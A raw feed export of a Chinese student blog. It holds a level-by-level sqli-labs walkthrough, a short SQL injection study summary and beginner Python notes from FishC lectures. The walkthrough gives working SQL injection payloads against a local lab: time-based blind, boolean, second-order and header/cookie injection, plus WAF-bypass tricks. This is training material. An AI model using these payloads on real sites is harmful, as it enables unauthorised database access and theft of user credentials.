<p>利用BENCHMARK()进行延时注入</p>
<p>当结果正确的时候，运行ENCODE(‘MSG’,’by 5 seconds’)操作50000000次，会占用一段时间。</p>
<h4 id="solution-5"><a href="#solution-5" class="headerlink" title="solution"></a>solution</h4><p>payload：</p>
<p><a href="http://127.0.0.1/sqllib/Less-9/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1/sqllib/Less-9/?id=1&#39;and</a> If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))–+</p>
<h3 id="less-10-GET-Blind-Time-based-double-quotes"><a href="#less-10-GET-Blind-Time-based-double-quotes" class="headerlink" title="less-10 GET - Blind - Time based - double quotes"></a>less-10 GET - Blind - Time based - double quotes</h3><p> (基于时间的双引号盲注)</p>
<p>与less-9一样，只是从 ’ 变成 “ </p>
<h3 id="less-11-POST-Error-Based-single-quotes-String"><a href="#less-11-POST-Error-Based-single-quotes-String" class="headerlink" title="less-11 POST - Error Based - single quotes - String"></a>less-11 POST - Error Based - single quotes - String</h3><p>在GET型里面用到的大部分方法都可以使用</p>
<h3 id="less-12-POST-Error-Based-Double-quotes-String-with-twist"><a href="#less-12-POST-Error-Based-Double-quotes-String-with-twist" class="headerlink" title="less-12 POST - Error Based - Double quotes - String - with twist"></a>less-12 POST - Error Based - Double quotes - String - with twist</h3><p><strong>’</strong> 变 <strong>”</strong></p>
<h3 id="less-13-POST-Double-injection-Single-quotes-String-with-twist"><a href="#less-13-POST-Double-injection-Single-quotes-String-with-twist" class="headerlink" title="less-13 POST Double injection - Single quotes - String - with twist"></a>less-13 POST Double injection - Single quotes - String - with twist</h3><p>从错误回显中知道对id进行了 <strong>‘)</strong>处理，所以用布尔盲注来判断是否成功login</p>
<h4 id="solution-6"><a href="#solution-6" class="headerlink" title="solution"></a>solution</h4><p>payload:</p>
<p>猜版本号</p>
<p>uname=admin’)and left(@@version,1)=5%23 &amp;passwd=2222&amp;submit=Submit</p>
<h3 id="less-14-POST-Double-injection-Single-quotes-String-with-twist"><a href="#less-14-POST-Double-injection-Single-quotes-String-with-twist" class="headerlink" title="less-14 POST - Double injection - Single quotes - String - with twist"></a>less-14 POST - Double injection - Single quotes - String - with twist</h3><p>有报错，可以用报错注入</p>
<h4 id="solution-7"><a href="#solution-7" class="headerlink" title="solution"></a>solution</h4><p>payload</p>
<h3 id="less-15-POST-Blind-Boolian-time-Based-Single-quotes"><a href="#less-15-POST-Blind-Boolian-time-Based-Single-quotes" class="headerlink" title="less-15 POST - Blind - Boolian/time Based - Single quotes"></a>less-15 POST - Blind - Boolian/time Based - Single quotes</h3><p>没有错误回显，可以用布尔盲注和延时注入</p>
<h4 id="solution-8"><a href="#solution-8" class="headerlink" title="solution"></a>solution</h4><p>payload</p>
<h3 id="less-16-POST-Blind-Boolian-Time-Based-Double-quotes"><a href="#less-16-POST-Blind-Boolian-Time-Based-Double-quotes" class="headerlink" title="less-16 POST - Blind - Boolian/Time Based - Double quotes"></a>less-16 POST - Blind - Boolian/Time Based - Double quotes</h3><p>单引号变双引号</p>
<h3 id="less-17-POST-Update-Query-Error-Based-String"><a href="#less-17-POST-Update-Query-Error-Based-String" class="headerlink" title="less-17 POST - Update Query - Error Based - String"></a>less-17 POST - Update Query - Error Based - String</h3><p>这题只能从password处注入，因为username处的特殊字符都用 check_input()函数 经过了特殊转义</p>
<p><a href="http://www.cnblogs.com/lcamry/p/5763048.html" target="_blank" rel="noopener">增删改函数介绍</a></p>
<h3 id="less-18-POST-Header-injection-Uagent-field-Error-based"><a href="#less-18-POST-Header-injection-Uagent-field-Error-based" class="headerlink" title="less-18 POST - Header injection - Uagent field - Error based"></a>less-18 POST - Header injection - Uagent field - Error based</h3><p>这一题把password处也跟username一样处理了，所以那两处都无法注入了。看代码得知这里的注入是INSERT类型的，INSERT注入可以利用报错注入的方式获取数据。</p>
<h3 id="less-19-POST-Header-injection-Referer-field-Error-based"><a href="#less-19-POST-Header-injection-Referer-field-Error-based" class="headerlink" title="less-19 POST - Header injection Referer field - Error based"></a>less-19 POST - Header injection Referer field - Error based</h3><p>跟上一题一样，只是在referer中注入</p>
<h3 id="less-20-POST-Cookie-injection-Uagent-field-error-based"><a href="#less-20-POST-Cookie-injection-Uagent-field-error-based" class="headerlink" title="less-20 POST - Cookie injection - Uagent field - error based"></a>less-20 POST - Cookie injection - Uagent field - error based</h3><p>username获取 -&gt; cookie -&gt; username读取 -&gt; 查询</p>
<h3 id="less-21-POST-Dump-into-outfile-String"><a href="#less-21-POST-Dump-into-outfile-String" class="headerlink" title="less-21 POST Dump into outfile - String"></a>less-21 POST Dump into outfile - String</h3><p>跟上一题一样，只是cookie要base64编码一下</p>
<h3 id="less-22-Future-Editions"><a href="#less-22-Future-Editions" class="headerlink" title="less-22 Future Editions"></a>less-22 Future Editions</h3><p>把‘变成”</p>
<h3 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h3><p>基于page-2 都是一些绕waf的题，所以顺便将绕waf的新姿势mark下来。</p>
<h4 id="过滤-or-和-and"><a href="#过滤-or-和-and" class="headerlink" title="过滤 or 和 and"></a>过滤 or 和 and</h4><p>大小写变形 Or,OR,oR<br>编码，hex，urlencode<br>添加注释/<em>or</em>/<br>利用符号 and=&amp;&amp; or=||</p>
<h4 id="过滤-空格，or，and-–-等各种符号"><a href="#过滤-空格，or，and-–-等各种符号" class="headerlink" title="过滤 空格，or，and,/*,#,–,/等各种符号"></a>过滤 空格，or，and,/*,#,–,/等各种符号</h4><p>过滤 空格，or，and,/*,#,–,/等各种符号<br>对于注释和结尾字符的我们此处只能利用构造一个 ‘ 来闭合后面到 ‘ ；对于空格，有较多的方法：</p>
<p>%09 TAB键（水平）<br>%0a 新建一行<br>%0c 新的一页<br>%0d return功能<br>%0b TAB键（垂直）<br>%a0 空格</p>
<h3 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h3><p>过滤了# 和–<br>用’闭合后面的’即可</p>
<h3 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h3><p>二次排序注入</p>
<p>注册一个admin’#帐号，然后登录，修改密码。发现修改的是admin的密码！</p>
<h3 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h3><p>过滤 or 和 and</p>
<h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><p>不同于25关的是sql语句中对于id，没有’’的包含，同时没有输出错误项，报错注入不能用。其余基本上和25示例没有差别。此处采取两种方式：延时注入和联合注入。</p>
<h3 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h3><p>过滤 空格，or，and,/*,#,–,/等各种符号</p>
<h3 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h3><p>这关与26的区别在于，sql语句添加了一个括号，同时在sql语句执行抛出错误后并不在前台页面输出。所有我们排除报错注入，这里依旧是利用union注入。 </p>
<h3 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h3><p>增加过滤 union，select</p>
<h3 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h3><p>本关与27关的区别在于对于id的处理，这里用的是 “ ，同时mysql的错误不会在前端页面显示。</p>
<h3 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h3></the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Summary </tag>
            
            <tag> SQL Injection </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SQL Injection 学习小记]]></title>
      <url>/2018/01/28/sqlinjection-note/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>一大早被各种祝福morning-call，在此，靴靴大家的祝福！虽然今天牛一，但也不能忘记学习 :) </p>
<p>2月份马上到了～离开学也不远了，寒假的Tasks该完成的一定要按时完成！<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">

<p>​    高三毕业那个暑假就已经用sqli-lab学了一点点SQL Injection，但是好像还没有彻彻底底的明白payload为何如此构造。。经过一学期的各种学习，做做ctf题，拓展自己的知识面后，现在好像有点恍然大悟的赶脚！！</p>
<p><br></p>
<p>一个寒假的SQL Injection 学习成果，总结如下</p>
<p><img src="https://ws3.sinaimg.cn/large/006tNc79gy1foqfmk46xij31kw0t9ajb.jpg" alt=""></p>
<h3 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h3><p><a href="http://www.cnblogs.com/Vinson404/p/7253255.html" target="_blank" rel="noopener">SQL注入绕过技巧</a></p>
<p><a href="http://blog.csdn.net/linyt/article/details/52966555" target="_blank" rel="noopener">如何利用SQL注入进行爆库</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/22397455?refer=sss95zz" target="_blank" rel="noopener">你真的会SQL注入攻击吗？（上）</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/22397620" target="_blank" rel="noopener">你真的会SQL注入攻击吗？（下）</a></p>
</the></excerpt>]]></content>
      
        <categories>
            
            <category> Study </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Summary </tag>
            
            <tag> SQL Injection </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python Notes]]></title>
      <url>/2018/01/05/python/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要="">

<p>Some python studying notes from FishC lectures.<a id="more"></a></p>
<the rest="" of="" contents="" |="" 余下全文="">

<p><br></p>
<h2 id="1-我和python的第一次亲密接触"><a href="#1-我和python的第一次亲密接触" class="headerlink" title="1.我和python的第一次亲密接触"></a>1.我和python的第一次亲密接触</h2><p><a href="http://bbs.fishc.com/thread-35509-1-1.html" target="_blank" rel="noopener">Python3 与Python2* 的区别</a></p>
<p>Python3 可以给变量命名中文名</p>
<h2 id="2-用Python设计的第一个游戏"><a href="#2-用Python设计的第一个游戏" class="headerlink" title="2.用Python设计的第一个游戏"></a>2.用Python设计的第一个游戏</h2><p>注意<strong>Tab</strong>的运用</p>
<p>流程图的重要性（logic）</p>
<p>内置函数（built-in functions 简称BIF）（通过import调入）</p>
<p><strong>In addition：</strong></p>
<p>Python程序内不需要事先声明变量，可以直接赋值使用</p>
<p>另外需要注意if和else语句的使用方法， 注意  <strong>“ ：” </strong></p>
<p>赋运算符值”=”和比较运算符 “==” 的区别。</p>
<h2 id="3-插曲之变量与字符串"><a href="#3-插曲之变量与字符串" class="headerlink" title="3.插曲之变量与字符串"></a>3.插曲之变量与字符串</h2><h4 id="变量："><a href="#变量：" class="headerlink" title="变量："></a>变量：</h4><p>由字母、数字、下划线组成，且首位不允许是数字</p>
<h4 id="字符串："><a href="#字符串：" class="headerlink" title="字符串："></a>字符串：</h4><h4 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h4><h4 id="原始字符串："><a href="#原始字符串：" class="headerlink" title="原始字符串："></a>原始字符串：</h4><p>在Python中，反斜杠主要用来作为转义字符的，当我们需要用其本身含义时，可以对其自身前面加一个转义字符处理。但是对于一些特殊的字符串，如果里面频繁用到反斜杠，再手动的去一个个加就显得繁琐，这个时候可以在其字符串前面加上一个字母r轻松解决，这就是原始字符串的含义，让字符串中的反斜杠回归其原始的本意。例如字符串C:\Program File\Intel\WiFi\Help，定义只要r’C:\Program File\Intel\WiFi\Help’，它的实现方法其实很简单，就是程序会自动对每一个反斜杠前面再加一个反斜杠。但是r不能对末尾是反斜杠的字符串进行定义，’C:\Temp\’。这个时候如果非要使用r进行原始字符串操作的话可以采用如下形式解决：r’C:\Temp’ ‘\‘ 或者r’C:\Temp’+’\‘。</p>
<h4 id="长字符串："><a href="#长字符串：" class="headerlink" title="长字符串："></a>长字符串：</h4><p>一般情况下，使用单引号或者双引号只能引一行的字符串，如果字符串是有多行组成，则需要使用三引号</p>
<h2 id="4-改进我们的小游戏"><a href="#4-改进我们的小游戏" class="headerlink" title="4.改进我们的小游戏"></a>4.改进我们的小游戏</h2><h4 id="Python-“and”和C-“-amp-amp-”-有什么区别"><a href="#Python-“and”和C-“-amp-amp-”-有什么区别" class="headerlink" title="Python “and”和C “&amp;&amp;” 有什么区别"></a>Python “and”和C “&amp;&amp;” 有什么区别</h4><p>在c中，0&amp;&amp;3 = 0,1&amp;&amp;3 = 1在python中，,0 and 3 = 0，1 and 3 = 3!</p>
<h4 id="短路逻辑（short-circuit-logic）"><a href="#短路逻辑（short-circuit-logic）" class="headerlink" title="短路逻辑（short-circuit logic）"></a>短路逻辑（short-circuit logic）</h4><p>逻辑操作符有个有趣的特性：在不需要求值的时候不进行操作。这么说可能比较“高深”，举个例子，表达式 x and y，需要 x 和 y 两个变量同时为真(True)的时候，结果才为真。因此，如果当 x 变量得知是假(False)的时候，表达式就会立刻返回 False，而不用去管 y 变量的值。<br>这种行为被称为短路逻辑（short-circuit logic）或者惰性求值（lazy evaluation），这种行为同样也应用与 or 操作符。</p>
<h2 id="5-闲聊之Python的数据类型"><a href="#5-闲聊之Python的数据类型" class="headerlink" title="5.闲聊之Python的数据类型"></a>5.闲聊之Python的数据类型</h2><h3 id="基本数据类型："><a href="#基本数据类型：" class="headerlink" title="基本数据类型："></a>基本数据类型：</h3><h4 id="int-（整型）"><a href="#int-（整型）" class="headerlink" title="int （整型）"></a>int （整型）</h4><p>在Python3中长整形和整形归为一类，所有的整数都属于整型，例如1，0,1000,1203等等</p>
<h4 id="float-（浮点型）"><a href="#float-（浮点型）" class="headerlink" title="float （浮点型）"></a>float （浮点型）</h4><p>数字中有小数点的数，如12.1   1.85   10.0  等等，另外1e10也表示浮点数</p>
<h4 id="str-（字符串）"><a href="#str-（字符串）" class="headerlink" title="str （字符串）"></a>str （字符串）</h4><p>所有以单引号或双引号括起来的值都叫做字符串，例如“小甲鱼”</p>
<h4 id="bool-（布尔型）"><a href="#bool-（布尔型）" class="headerlink" title="bool （布尔型）"></a>bool （布尔型）</h4><p>布尔类型只有两个值，True 或False ，记得在Python里面这两个值首字母均大写。</p>
<h3 id="e记法-gt-科学计数法"><a href="#e记法-gt-科学计数法" class="headerlink" title="e记法-&gt; 科学计数法"></a>e记法-&gt; 科学计数法</h3><p>0.000000000000135用e记法表示为1.35<strong>e-13</strong>,它是一个浮点数类型</p>
<h3 id="数据类型转换"><a href="#数据类型转换" class="headerlink" title="数据类型转换"></a>数据类型转换</h3><h4 id="整型强制转换函数-int"><a href="#整型强制转换函数-int" class="headerlink" title="整型强制转换函数 int()"></a>整型强制转换函数 int()</h4><p>可以将纯数字的字符串或浮点型强制转换为整形，如int(‘0012’)为12；  int(12.5)为12   -&gt;  <strong>截断大法</strong></p>
<p>若要“四舍五入”取整，则须：</p>
<p>5.4 “四舍五入”结果为：5，int(5.4+0.5) == 5<br>5.6 “四舍五入”结果为：6，int(5.6+0.5) == 6</p>
<h4 id="浮点型强制转换函数float"><a href="#浮点型强制转换函数float" class="headerlink" title="浮点型强制转换函数float()"></a>浮点型强制转换函数float()</h4><p>可以将包含一个小数点的数字字符串或者整形转换为浮点型，如float(‘0012’)为12.0，<br>float(‘.123’)为0.123； float(12)为12.0<br>字符串强制类型转换函数str(),可以将任何类型转换为字符串类型，例如str(1e28)为‘1e+28’  str(1e2)为’100.0’等等</p>
<h3 id="数据类型信息获取"><a href="#数据类型信息获取" class="headerlink" title="数据类型信息获取"></a>数据类型信息获取</h3><h4 id="函数type"><a href="#函数type" class="headerlink" title="函数type()"></a>函数<strong>type()</strong></h4><p>直接给出数的数据类型，例如type(12.0)则返回float，type(1000)返回int， type(False)返回bool等</p>
<h4 id="函数isinstance"><a href="#函数isinstance" class="headerlink" title="函数isinstance()"></a>函数<strong>isinstance()</strong></h4><p>需要给出需要判断的数和一个数据类型，是则返回True，否则返回False，如isinstace(1,int)返回<br>True ，isinstance(12.5,float)返回True，isinstance(‘I love u’,float)返回False，而isinstance(‘I love u’,str)返回True</p>
<blockquote>
<p>s为字符串<br>s.isalnum()  所有字符都是数字或者字母，为真返回 Ture，否则返回 False。<br>s.isalpha()   所有字符都是字母，为真返回 Ture，否则返回 False。<br>s.isdigit()     所有字符都是数字，为真返回 Ture，否则返回 False。<br>s.islower()    所有字符都是小写，为真返回 Ture，否则返回 False。<br>s.isupper()   所有字符都是大写，为真返回 Ture，否则返回 False。<br>s.istitle()      所有单词都是首字母大写，为真返回 Ture，否则返回 False。<br>s.isspace()   所有字符都是空白字符，为真返回 Ture，否则返回 False。</p>
</blockquote>
<p><strong>Exercise</strong></p>
<ol>
<li>写一个程序，判断给定年份是否为闰年。（注意：请使用已学过的 BIF 进行灵活运用）<br>这样定义闰年的:能被4整除但不能被100整除,或者能被400整除都是闰年。   </li>
</ol>
<h2 id="6-Python之常用操作符"><a href="#6-Python之常用操作符" class="headerlink" title="6.Python之常用操作符"></a>6.Python之常用操作符</h2><h3 id="算术运算符"><a href="#算术运算符" class="headerlink" title="算术运算符"></a>算术运算符</h3><p>加（+），减（-），乘（<em>），除（/），幂运算（*</em>），地板除（//）</p>
<h4 id="和-的区别"><a href="#和-的区别" class="headerlink" title="/和//的区别"></a>/和//的区别</h4><p>在Python中的除运算符与其它程序语言的不太一样，/表示真正的除号，例如1/3=0.3333333333333333，而4/2的值为2.0。说明两个数相除的值是一个浮点数，而其它程序语言/却表示两个整数相除，只返回一个整数。Python后来为了兼容这种用法，引入了//来实现。例如3//2的值为1，而3.0//2的值为1.0，且3//2.0的值也为1.0。说明在Python中//符号两边同为整数时的值才为整数，否则则为一个浮点数（后面带’.0’）。</p>
<h4 id="运算符与负号（-）运算符的优先级问题"><a href="#运算符与负号（-）运算符的优先级问题" class="headerlink" title="**运算符与负号（-）运算符的优先级问题"></a>**运算符与负号（-）运算符的优先级问题</h4><p>在Python中，‘-’在一个数字前面表示成负号，例如-3，-5.12等。**在-的右边时，其优先级高于-，例如-2**2相当于-（2*<em>2）等于-4，而当其在右边时优先级低于-，如2\</em>*-2则相当于2**（-2）等于0.25.</p>
<h4 id="允许运算符与等号一起使用，表示变量本身参加运算并重新赋值给变量，例如-x-5，x-5后，x的值为10"><a href="#允许运算符与等号一起使用，表示变量本身参加运算并重新赋值给变量，例如-x-5，x-5后，x的值为10" class="headerlink" title="允许运算符与等号一起使用，表示变量本身参加运算并重新赋值给变量，例如 x =5，x+=5后，x的值为10"></a>允许运算符与等号一起使用，表示变量本身参加运算并重新赋值给变量，例如 x =5，x+=5后，x的值为10</h4><h3 id="逻辑操作符"><a href="#逻辑操作符" class="headerlink" title="逻辑操作符"></a>逻辑操作符</h3><h4 id="and"><a href="#and" class="headerlink" title="and"></a>and</h4><p>x and y 的值计算过程为先判断x的值，如果为0则返回0，否则返回y的值，  例如 3 and  4 值为4；0 and 4 值为0</p>
<h4 id="or"><a href="#or" class="headerlink" title="or"></a>or</h4><p>x or y 的值计算过程为先判断x的值，如果为0则返回y的值，否则返回x的值，例如 3 or 4的值为 3；0 or 4的值为4</p>
<h4 id="not"><a href="#not" class="headerlink" title="not"></a>not</h4><p>not x 的值的计算过程为先判断x的值，如果为0则返回True，否则返回False 例如 not 0的值为True； not 0.12 值为False</p>
<h4 id="优先级"><a href="#优先级" class="headerlink" title="优先级"></a>优先级</h4><p>三者的优先级  not &gt; and &gt;or</p>
<h3 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h3><p>&lt;    &lt;=      &gt;     &gt;=     ==      !=</p>
<p>返回值为bool型</p>
<h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><p>=</p>
<p>Python中允许  x=y=z=2，表示x,y,z的值均为2</p>
<h3 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h3><p>几元运算符指的是运算符的操作数有几个；一般而言优先级上一元运算符高于二元运算符，算数运算符优先级&gt;比较运算符&gt;逻辑运算符</p>
<p><img src="http://xxx.fishc.com/forum/201508/25/141958lu8ugzyymrxyannz.png"></p>
<p><strong>Exercise</strong></p>
<ol>
<li>请写一个程序打印出 0~100 所有的奇数。   </li>
<li>我们说过现在的 Python 可以计算很大很大的数据，但是……真正的大数据计算可是要靠刚刚的硬件滴，不妨写一个小代码，让你的计算机为之崩溃？    9-</li>
<li>爱因斯坦曾出过这样一道有趣的数学题：有一个长阶梯，若每步上2阶，最后剩1阶；若每步上3阶，最后剩2阶；若每步上5阶，最后剩4阶；若每步上6阶，最后剩5阶；只有每步上7阶，最后刚好一阶也不剩。 （小甲鱼温馨提示：步子太大真的容易扯着蛋<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br></pre></td><td class="code"><pre><span class="line">  题目：请编程求解该阶梯至少有多少阶？  **(119)**</span><br><span class="line"></span><br><span class="line">## 7.了不起的分支和循环1</span><br><span class="line"></span><br><span class="line">## 8.了不起的分支和循环2</span><br><span class="line"></span><br><span class="line">### if 的三种用法</span><br><span class="line"></span><br><span class="line">```Python</span><br><span class="line">#1</span><br><span class="line">score = int(input(&quot;请输入一个分数：&quot;))</span><br><span class="line">if 100 &gt;= score &gt;= 90:</span><br><span class="line">        print(&quot;A&quot;)</span><br><span class="line">if 90 &gt; score &gt;= 80:</span><br><span class="line">        print(&quot;B&quot;)</span><br><span class="line">if 80 &gt; score &gt;= 70:</span><br><span class="line">        print(&quot;C&quot;)</span><br><span class="line">if 70 &gt; score &gt;= 60:</span><br><span class="line">        print(&quot;D&quot;)</span><br><span class="line">if 60 &gt; score:</span><br><span class="line">        print(&quot;E&quot;)</span><br><span class="line">if score &gt; 100:</span><br><span class="line">    print(&quot;输入错误！&quot;)</span><br><span class="line"></span><br><span class="line">#2</span><br><span class="line">score = int(input(&quot;请输入一个分数：&quot;))</span><br><span class="line">if 100 &gt;= score &gt;= 90:</span><br><span class="line">        print(&quot;A&quot;)</span><br><span class="line">else:</span><br><span class="line">    if 90 &gt; score &gt;= 80:</span><br><span class="line">            print(&quot;B&quot;)</span><br><span class="line">    else:</span><br><span class="line">        if 80 &gt; score &gt;= 70:</span><br><span class="line">                print(&quot;C&quot;)</span><br><span class="line">        else:</span><br><span class="line">            if 70 &gt; score &gt;= 60:</span><br><span class="line">                    print(&quot;D&quot;)</span><br><span class="line">            else:</span><br><span class="line">                if 60 &gt; score:</span><br><span class="line">                        print(&quot;E&quot;)</span><br><span class="line">                else:</span><br><span class="line">                    if score &gt; 100:</span><br><span class="line">                        print(&quot;输入错误！&quot;)</span><br><span class="line"></span><br><span class="line">#3</span><br><span class="line">score = int(input(&quot;请输入一个分数：&quot;))</span><br><span class="line">if 100 &gt;= score &gt;= 90:</span><br><span class="line">        print(&quot;A&quot;)</span><br><span class="line">elif 90 &gt; score &gt;= 80:</span><br><span class="line">        print(&quot;B&quot;)</span><br><span class="line">elif 80 &gt; score &gt;= 70:</span><br><span class="line">        print(&quot;C&quot;)</span><br><span class="line">elif 70 &gt; score 